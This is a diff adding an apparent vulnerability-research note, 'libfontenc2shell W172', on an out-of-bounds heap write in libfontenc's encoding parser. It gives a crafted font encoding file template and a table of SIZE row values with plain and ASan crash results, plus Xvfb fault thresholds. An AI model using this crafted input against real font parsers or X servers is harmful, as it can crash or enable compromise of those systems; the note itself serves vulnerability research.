@@ -1,0 +1,33 @@
+libfontenc2shell W172: SIZE row-count sweep through the exported FontEncFind()
+API, pinned vulnerable build at 7418fa7, one mapping 0xff00 0x5a5a, input
+generated as:
+
+  STARTENCODING crafted
+  SIZE 256 <row>
+  STARTMAPPING unicode
+  0xff00 0x5a5a
+  ENDMAPPING
+  ENDENCODING
+
+Driver: realpath/bin-vuln-{plain,asan} (load_via_public_api.c), with
+FONT_ENCODINGS_DIRECTORY pointing at a directory holding that crafted.enc and
+encodings.dir. index = 255 * row; the buffer is capped at 0x10000 entries.
+A single mapping skips the identity ramp (first == last == index), so the
+only OOB write is the chosen 0x5a5a store at encparse.c:495.
+
+row      index     plain rc   ASan rc   ASan report (first line)
+256      65280     0          0         none
+258      65790     0          1         heap-buffer-overflow, WRITE of size 2 at
+                                        ../src/encparse.c:495, 508 bytes past
+512      130560    -11        0         none (destination mapped; not diagnosed)
+1024     261120    -11        1         SEGV at ../src/encparse.c:495
+4096     1044480   -11        1         SEGV at ../src/encparse.c:495
+16384    4177920   -11        0         none (destination mapped; not diagnosed)
+65536    16711680  -11        1         SEGV at ../src/encparse.c:495
+262144   66846720  -11        1         SEGV at ../src/encparse.c:495
+
+Negative: the public-API harness faults in a plain build from row 512 upward,
+but the live Xvfb only faults from row 1024 (see plain-crash.txt); allocator
+placement differs between the two processes. ASan's silent cases at rows 512
+and 16384 are NOT passes: the chosen store landed in mapped memory that was
+not diagnosed. No live object or pointer was identified there.
